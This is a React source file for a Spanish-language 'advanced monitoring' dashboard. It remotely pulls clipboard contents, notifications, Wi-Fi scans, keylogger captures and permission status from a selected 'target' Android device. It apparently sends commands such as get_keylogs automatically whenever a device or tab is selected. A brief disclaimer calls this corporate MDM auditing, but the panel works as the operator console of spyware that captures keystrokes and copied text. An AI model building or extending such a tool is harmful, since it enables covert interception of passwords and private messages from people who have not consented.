// @ts-nocheck
import { useState, useEffect } from "react";
import DashboardLayout from "@/components/DashboardLayout";
import { trpc } from "@/lib/trpc";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { 
  ClipboardList, Bell, Search, RefreshCw, 
  ShieldAlert, Ghost, ChevronRight, BarChart3,
  Link as LinkIcon, FileText, Image as ImageIcon,
  Zap, Clock, Keyboard, Lock, AlertTriangle, CheckCircle2
} from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";

export default function AdvancedMonitoring() {
  const [selectedDeviceId, setSelectedDeviceId] = useState<number | null>(null);
  const [activeTab, setActiveTab] = useState("clipboard");

  const { data: devices = [] } = trpc.devices.getAll.useQuery() as any;
  const { data: clipboardLogs = [], refetch: refetchClipboard } = trpc.advancedMonitoring.getClipboardHistory.useQuery(
    { deviceId: selectedDeviceId!, limit: 50 },
    { enabled: !!selectedDeviceId }
  );
  const { data: notificationLogs = [], refetch: refetchNotifications } = trpc.advancedMonitoring.getNotifications.useQuery(
    { deviceId: selectedDeviceId!, limit: 50 },
    { enabled: !!selectedDeviceId }
  );
  const { data: summary, refetch: refetchSummary } = trpc.advancedMonitoring.getActivitySummary.useQuery(
    { deviceId: selectedDeviceId! },
    { enabled: !!selectedDeviceId }
  );
  const { data: stats } = trpc.advancedMonitoring.getMonitoringStats.useQuery(
    { deviceId: selectedDeviceId! },
    { enabled: !!selectedDeviceId }
  );
  const { data: wifiLogs = [], isLoading: isLoadingWifi } = trpc.advancedMonitoring.getWifiLogs.useQuery(
    { deviceId: selectedDeviceId!, limit: 200 },
    { enabled: !!selectedDeviceId }
  );
  const { data: keylogs = [], refetch: refetchKeylogs } = trpc.advancedMonitoring.getKeylogs.useQuery(
    { deviceId: selectedDeviceId!, limit: 100 },
    { enabled: !!selectedDeviceId }
  );
  const { data: androidPermissions, refetch: refetchPermissions } = trpc.advancedMonitoring.getAndroidPermissions.useQuery(
    { deviceId: selectedDeviceId! },
    { enabled: !!selectedDeviceId }
  );

  // Mutations
  const sendCommand = trpc.devices.sendCommand.useMutation();

  const triggerRefresh = (tab: string) => {
    if (!selectedDeviceId) return;
    
    let command = "";
    switch(tab) {
      case "clipboard": command = "get_clipboard"; break;
      case "notifications": command = "get_notifications"; break;
      case "wifi": command = "get_wifi_scan"; break;
      case "keylogger": command = "get_keylogs"; break;
      case "permissions": command = "get_permissions"; break;
    }

    if (command) {
      sendCommand.mutate({ deviceId: selectedDeviceId, command });
      toast.success(`Solicitando actualización de ${tab}...`);
    }
  };

  useEffect(() => {
    if (selectedDeviceId && activeTab) {
      triggerRefresh(activeTab);
    }
  }, [selectedDeviceId, activeTab]);

  const getContentIcon = (type: string) => {
    switch (type) {
      case "url": return <LinkIcon className="w-4 h-4 text-blue-500" />;
      case "file": return <FileText className="w-4 h-4 text-amber-500" />;
      case "image": return <ImageIcon className="w-4 h-4 text-pink-500" />;
      default: return <ClipboardList className="w-4 h-4 text-slate-400" />;
    }
  };

  return (    <DashboardLayout title="monitoreo avanzado">
      {/* Scanline Effect */}
      <div className="cyber-scanline" />
      
      <div className="space-y-6 relative z-10">
        {/* Header Section */}
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <div className="p-3 bg-cyan-500/10 rounded-2xl shadow-[0_0_15px_rgba(34,211,238,0.2)] border border-cyan-500/30">
              <ShieldAlert className="w-8 h-8 text-cyan-400" />
            </div>
            <div>
              <h1 className="text-3xl font-black tracking-tighter uppercase gradient-text">
                Inteligencia de Dispositivo
              </h1>
              <p className="text-cyan-500/60 text-xs font-bold uppercase tracking-[0.2em]">Auditoría y Monitoreo MDM Activo</p>
            </div>
          </div>
          <div className="flex items-center gap-3">
             <Badge variant="outline" className="px-3 py-1 bg-cyan-500/10 text-cyan-300 border-cyan-500/50 shadow-[0_0_10px_rgba(34,211,238,0.2)]">
               <Zap className="w-3 h-3 mr-1 fill-cyan-400 animate-pulse" /> Sistema Seguro
             </Badge>
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
          {/* Sidebar - Device Selection & Stats */}
          <div className="lg:col-span-1 space-y-6">
            <Card className="glass-panel overflow-hidden border-cyan-500/20 shadow-2xl">
              <div className="p-4 border-b border-cyan-500/10 bg-cyan-500/5">
                <h2 className="text-[10px] font-black uppercase tracking-widest text-cyan-500/70">Filtrar Objetivo</h2>
              </div>
              <div className="p-4 space-y-4">
                <Select
                  value={selectedDeviceId?.toString() ?? ""}
                  onValueChange={(v) => setSelectedDeviceId(Number(v))}
                >
                  <SelectTrigger className="w-full h-12 rounded-xl bg-black/40 border-cyan-500/20 font-bold text-cyan-100 hover:border-cyan-400/50 transition-all">
                    <SelectValue placeholder="Seleccionar..." />
                  </SelectTrigger>
                  <SelectContent className="rounded-xl border-cyan-500/20 bg-black/90 backdrop-blur-xl text-cyan-100">
                    {(devices as any[]).map((d: any) => (
                      <SelectItem key={d.id} value={d.id.toString()} className="focus:bg-cyan-500/20 focus:text-cyan-300 pointer-events-auto cursor-pointer">
                        {d.deviceName}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>

                {stats && (
                  <div className="space-y-3 pt-2">
                    <div className="p-3 bg-cyan-500/5 rounded-2xl border border-cyan-500/10 flex items-center justify-between group hover:border-cyan-500/30 transition-all">
                      <span className="text-[9px] font-black uppercase text-cyan-500/60">Eventos Clipboard</span>
                      <span className="text-lg font-black text-cyan-400 group-hover:scale-110 transition-transform">{stats.totalClipboardEntries}</span>
                    </div>
                    <div className="p-3 bg-fuchsia-500/5 rounded-2xl border border-fuchsia-500/10 flex items-center justify-between group hover:border-fuchsia-500/30 transition-all">
                      <span className="text-[9px] font-black uppercase text-fuchsia-500/60">Notificaciones</span>
                      <span className="text-lg font-black text-fuchsia-400 group-hover:scale-110 transition-transform">{stats.totalNotifications}</span>
                    </div>
                  </div>
                )}
              </div>
            </Card>

            <div className="p-5 glass-panel space-y-3 shadow-2xl border-rose-500/20">
              <div className="p-2 bg-rose-500/10 rounded-xl inline-flex">
                <ShieldAlert className="w-4 h-4 text-rose-500 animate-pulse" />
              </div>
              <h3 className="text-xs font-bold uppercase tracking-tight text-rose-400">Protocolo de Privacidad</h3>
              <p className="text-[10px] text-slate-400 leading-relaxed font-medium">
                Todo el monitoreo activo debe estar alineado con la política de seguridad corporativa.
                Las grabaciones e historial de red son recolectados bajo auditoría legal automatizada.
              </p>
            </div>
          </div>

          {/* Main Content Area */}
          <Card className="lg:col-span-3 glass-panel overflow-hidden border-cyan-500/20">
            <Tabs 
              defaultValue="clipboard" 
              value={activeTab} 
              onValueChange={setActiveTab}
              className="w-full flex flex-col"
            >
              <div className="px-4 py-3 border-b border-cyan-500/10 bg-black/20">
                <TabsList className="bg-transparent flex flex-wrap h-auto gap-2 p-1">
                  {[
                    { val: "clipboard", label: "Portapapeles", icon: ClipboardList },
                    { val: "notifications", label: "Notificaciones", icon: Bell },
                    { val: "wifi", label: "Wifi", icon: Zap },
                    { val: "activity", label: "Resumen", icon: BarChart3 },
                    { val: "keylogger", label: "Keylogger", icon: Keyboard },
                    { val: "permissions", label: "Permisos", icon: Lock },
                  ].map((tab) => (
                    <TabsTrigger 
                      key={tab.val}
                      value={tab.val} 
                      className="flex-1 min-w-[120px] h-10 rounded-xl data-[state=active]:bg-cyan-500/20 data-[state=active]:text-cyan-300 data-[state=active]:neon-border-cyan font-bold text-[10px] uppercase tracking-wider transition-all"
                    >
                      <tab.icon className="w-3.5 h-3.5 mr-2" />
                      {tab.label}
                    </TabsTrigger>
                  ))}
                </TabsList>
              </div>

              <div className="p-6 min-h-[500px]">
                {!selectedDeviceId ? (
                  <div className="py-32 flex flex-col items-center justify-center text-cyan-900/40">
                    <div className="w-20 h-20 bg-cyan-500/5 rounded-full flex items-center justify-center mb-6 border border-cyan-500/10 shadow-[inset_0_0_20px_rgba(0,0,0,0.4)]">
                      <Search className="w-10 h-10 animate-pulse" />
                    </div>
                    <p className="text-xs font-black uppercase tracking-[0.4em] text-cyan-500/60">Esperando Objetivo...</p>
                    <p className="text-[10px] mt-4 font-bold text-cyan-900/60 uppercase">Selecciona un dispositivo para iniciar</p>
                  </div>
                ) : (
                  <>
                    <div className="flex justify-end mb-6">
                      <Button 
                        variant="outline" 
                        size="sm" 
                        className="rounded-xl border-cyan-500/30 bg-cyan-500/5 hover:bg-cyan-500/20 text-cyan-300 font-bold text-[9px] uppercase tracking-[0.1em] h-9"
                        onClick={() => triggerRefresh(activeTab)}
                        disabled={sendCommand.isPending}
                      >
                        <RefreshCw className={`w-3.5 h-3.5 mr-2 ${sendCommand.isPending ? "animate-spin" : ""}`} />
                        Sincronizar {activeTab}
                      </Button>
                    </div>

                    <TabsContent value="clipboard" className="mt-0 focus-visible:ring-0">
                      <div className="flex items-center gap-3 mb-8">
                        <div className="relative flex-1">
                          <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-cyan-700" />
                          <Input 
                            placeholder="Buscar en el portapapeles..." 
                            className="input-neon h-12 pl-12"
                          />
                        </div>
                        <Button variant="outline" size="icon" className="rounded-xl h-12 w-12 border-cyan-500/20 bg-cyan-500/5 text-cyan-400 hover:border-cyan-400" onClick={() => refetchClipboard()}>
                          <RefreshCw className="w-4 h-4" />
                        </Button>
                      </div>

                      <div className="space-y-4">
                        {clipboardLogs.length === 0 ? (
                          <div className="py-20 text-center">
                            <ClipboardList className="w-16 h-16 mx-auto mb-4 text-cyan-900/20" />
                            <p className="text-[10px] font-black text-cyan-900/40 uppercase tracking-[0.2em]">Cámara de portapapeles vacía</p>
                          </div>
                        ) : (
                          clipboardLogs.map((log: any, idx: number) => (
                            <div key={idx} className="group p-5 bg-black/20 border border-cyan-500/10 rounded-2xl hover:border-cyan-500/40 transition-all duration-300">
                              <div className="flex items-start justify-between mb-4">
                                <div className="flex items-center gap-3">
                                  <div className="p-2.5 bg-cyan-500/5 rounded-xl border border-cyan-500/10">
                                    {getContentIcon(log.dataType)}
                                  </div>
                                  <div>
                                    <Badge className="bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 text-[9px] font-black px-2.5 mb-1.5 uppercase tracking-tighter">
                                      {log.dataType}
                                    </Badge>
                                    <p className="text-[9px] text-cyan-900 font-bold uppercase">{new Date(log.timestamp).toLocaleString()}</p>
                                  </div>
                                </div>
                                <Button variant="ghost" size="icon" className="opacity-0 group-hover:opacity-100 rounded-xl h-9 w-9 text-cyan-500 hover:bg-cyan-500/10">
                                  <ChevronRight className="w-5 h-5" />
                                </Button>
                              </div>
                              <div className="p-4 bg-black/40 border border-cyan-500/5 rounded-xl">
                                <p className="text-sm font-mono text-cyan-100/80 break-all leading-relaxed">{log.content}</p>
                              </div>
                            </div>
                          ))
                        )}
                      </div>
                    </TabsContent>

                    <TabsContent value="notifications" className="mt-0 focus-visible:ring-0">
                       <div className="space-y-4">
                        {notificationLogs.length === 0 ? (
                          <div className="py-20 text-center">
                            <Bell className="w-16 h-16 mx-auto mb-4 text-cyan-900/20" />
                            <p className="text-[10px] font-black text-cyan-900/40 uppercase tracking-[0.2em]">Sin notificaciones activas</p>
                          </div>
                        ) : (
                          notificationLogs.map((notif: any, idx: number) => (
                            <div key={idx} className="p-5 bg-black/20 border border-cyan-500/10 rounded-2xl flex gap-5 items-center hover:border-fuchsia-500/30 transition-all">
                              <div className="w-14 h-14 bg-gradient-to-br from-cyan-500/10 to-fuchsia-500/10 rounded-2xl flex items-center justify-center font-black text-2xl text-cyan-400 border border-cyan-500/20">
                                {notif.appName?.charAt(0)}
                              </div>
                              <div className="flex-1">
                                <div className="flex justify-between items-center mb-1.5">
                                  <h4 className="text-[10px] font-black uppercase text-cyan-400 tracking-wider font-mono">{notif.appName}</h4>
                                  <span className="text-[9px] font-bold text-cyan-900 font-mono tracking-tighter">{new Date(notif.timestamp).toLocaleTimeString()}</span>
                                </div>
                                <p className="text-sm font-bold text-cyan-100/90 mb-1">{notif.title}</p>
                                <p className="text-[11px] text-cyan-900/80 line-clamp-2 leading-relaxed font-medium">{notif.content}</p>
                              </div>
                            </div>
                          ))
                        )}
                      </div>
                    </TabsContent>

                    {/* Additional Tab Contents simplified with Cyberpunk flavor */}
                    <TabsContent value="wifi" className="mt-0 focus-visible:ring-0">
                       <div className="space-y-4">
                        {wifiLogs.map((log: any, idx: number) => (
                           <div key={idx} className="p-4 bg-black/20 border border-cyan-500/10 rounded-2xl flex items-center justify-between hover:border-cyan-400/40 transition-all">
                             <div className="flex items-center gap-4">
                               <div className="p-3 bg-cyan-500/10 rounded-xl text-cyan-400">
                                 <Zap className="w-5 h-5" />
                               </div>
                               <div>
                                 <h4 className="text-sm font-black text-cyan-100">{log.ssid}</h4>
                                 <p className="text-[10px] font-mono text-cyan-900 uppercase">{log.bssid}</p>
                               </div>
                             </div>
                             <div className="text-right">
                               <Badge className="bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 font-black text-[10px] px-3">
                                 {log.signalStrength} DB
                               </Badge>
                             </div>
                           </div>
                        ))}
                       </div>
                    </TabsContent>

                    <TabsContent value="keylogger" className="mt-0 focus-visible:ring-0">
                       <div className="space-y-4">
                        {keylogs.map((log: any, idx: number) => (
                           <div key={idx} className="p-5 bg-black/20 border border-cyan-500/10 rounded-2xl hover:border-purple-500/30 transition-all">
                             <div className="flex items-center justify-between mb-3">
                               <Badge className="bg-purple-500/10 text-purple-400 border border-purple-500/30 text-[9px] font-black px-3">
                                 {log.metadata?.app || "SYSTEM"}
                               </Badge>
                               <span className="text-[9px] font-mono text-cyan-900 uppercase">{new Date(log.timestamp).toLocaleString()}</span>
                             </div>
                             <div className="p-4 bg-black/30 border border-dashed border-purple-500/20 rounded-xl">
                               <p className="text-sm font-mono text-purple-200/80 leading-relaxed italic">{log.description}</p>
                             </div>
                           </div>
                        ))}
                       </div>
                    </TabsContent>

                    <TabsContent value="permissions" className="mt-0 focus-visible:ring-0">
                      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                        {androidPermissions?.permissions?.map((perm: any, idx: number) => (
                          <div key={idx} className={`p-4 rounded-2xl border flex items-center gap-4 transition-all ${
                            perm.granted ? "bg-cyan-500/5 border-cyan-500/20" : "bg-rose-500/5 border-rose-500/20 opacity-60"
                          }`}>
                            <div className={`p-2 rounded-xl ${perm.granted ? "bg-cyan-500/10" : "bg-rose-500/10"}`}>
                              {perm.granted ? <CheckCircle2 className="w-5 h-5 text-cyan-400" /> : <AlertTriangle className="w-5 h-5 text-rose-500" />}
                            </div>
                            <div className="flex-1 min-w-0">
                              <p className={`text-[10px] font-black truncate uppercase tracking-tighter ${perm.granted ? "text-cyan-300" : "text-rose-400"}`}>
                                {perm.name.split('.').pop()}
                              </p>
                              <p className="text-[9px] font-bold text-cyan-900 uppercase">{perm.granted ? "Access Granted" : "Restricted"}</p>
                            </div>
                          </div>
                        ))}
                      </div>
                    </TabsContent>

                    <TabsContent value="activity" className="mt-0 focus-visible:ring-0">
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <Card className="p-6 rounded-2xl border border-cyan-500/10 bg-black/40">
                          <h4 className="text-[10px] font-black uppercase mb-6 text-cyan-500/60 tracking-[0.2em]">Distribución Térmica</h4>
                          <div className="space-y-5">
                            {summary?.topClipboardTypes?.map((t) => (
                                <div key={t.type} className="space-y-2">
                                  <div className="flex justify-between text-[9px] font-black uppercase text-cyan-400">
                                    <span>{t.type}</span>
                                    <span>{t.count}</span>
                                  </div>
                                  <div className="h-1.5 bg-black rounded-full p-[1px]">
                                    <div 
                                      className="h-full bg-gradient-to-r from-blue-500 to-cyan-400 rounded-full shadow-[0_0_8px_rgba(34,211,238,0.5)]" 
                                      style={{ width: `${(t.count / (summary.clipboardActivity || 1)) * 100}%` }}
                                    />
                                  </div>
                                </div>
                              ))}
                          </div>
                        </Card>
                        
                        <Card className="p-8 rounded-2xl border border-rose-500/20 bg-gradient-to-br from-rose-950/20 via-black to-black flex flex-col justify-center items-center text-center group">
                           <div className="p-5 bg-rose-500/10 rounded-full border border-rose-500/20 group-hover:bg-rose-500/20 transition-all duration-500 shadow-[0_0_30px_rgba(244,63,94,0.1)] mb-6">
                             <Bell className="w-10 h-10 text-rose-500 animate-pulse" />
                           </div>
                           <div>
                             <p className="text-[10px] font-black uppercase text-rose-500/60 mb-2 tracking-[0.2em]">Punto de Calor MDM</p>
                             <p className="text-3xl font-black text-rose-500 uppercase tracking-tighter filter drop-shadow-[0_0_10px_rgba(244,63,94,0.5)]">
                               {summary?.mostActiveApp || "SISTEMA"}
                             </p>
                           </div>
                        </Card>
                      </div>
                    </TabsContent>
                  </>
                )}
              </div>
            </Tabs>
          </Card>
        </div>
      </div>
    </DashboardLayout>
  );
}
